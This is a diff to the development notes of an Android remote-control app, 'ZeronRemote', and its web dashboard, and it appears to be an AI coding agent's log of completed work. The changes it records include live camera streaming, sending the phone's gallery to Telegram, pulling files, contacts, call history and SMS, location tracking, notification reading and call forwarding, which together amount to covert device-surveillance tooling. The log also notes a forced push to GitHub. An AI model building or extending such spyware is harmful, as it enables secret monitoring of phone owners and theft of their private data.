@@ -175,3 +175,18 @@ Platform: Sketchware Pro (daydream v7), package `mata.pro`, files in `.sketchwar
 - **TelegramRemoteService.java** updated — all new commands wired + help text updated
 - All commands (50+): /images, /allvideos, /allaudio, /alldocs, /allapks, /allfolders, /storage, /ls, /starttrack, /lochistory, /trackon, /trackoff, /notify, /cf
 - Compile: clean (pre-existing okio only)
+
+### Web Dashboard Updates (2026-08-24) — ZeronRemote Website
+- **Fixed camera upside-down** — CSS `transform:scaleY(-1)` on cam.html and hub.html
+- **Fixed camera live stream** — changed from MJPEG stream to frame polling (img src refresh)
+- **Fixed gallery** — complete rewrite, proper data flow via `/api/data?key=gallery`, send to Telegram via `tgdl` command
+- **Fixed file manager downloads** — retry logic for `dlBrowser()`, proper `get` command flow
+- **Fixed call history icon** — broken ternary operator fixed
+- **Improved App List** — auto-refresh every 30s, proper command flow (`apps` command)
+- **Improved Contact List** — auto-refresh every 30s, proper command flow (`contacts` command)
+- **Improved Call History** — auto-refresh every 30s, proper command flow (`calls` command)
+- **Added navigation to hub.html** — links to all views (gallery, applist, contactlist, callhist, sms, control)
+- **Added Location & Tracking section** — Get Location, Track 30s, Periodic, Stop, History buttons
+- **Added Notifications & Calls section** — Read Notifs, Call Forward, Stop CF buttons
+- **Server.js** — already supports all view routes (hub, cam, screen, files, sms, applist, contactlist, callhist, gallery, control)
+- **Git pushed** to github.com/ZeronModz/zeronremote.git (forced push due to divergent branches)
